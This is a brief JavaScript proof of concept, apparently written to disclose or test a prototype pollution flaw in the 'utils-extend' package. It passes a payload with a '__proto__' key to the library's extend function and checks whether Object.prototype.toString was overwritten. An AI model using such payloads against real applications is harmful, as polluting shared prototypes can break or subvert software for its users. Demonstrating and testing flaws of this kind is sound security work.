const lib = require('utils-extend');

let payload = { ["__proto__"]: { "toString": "polluted" } };

lib.extend({}, payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
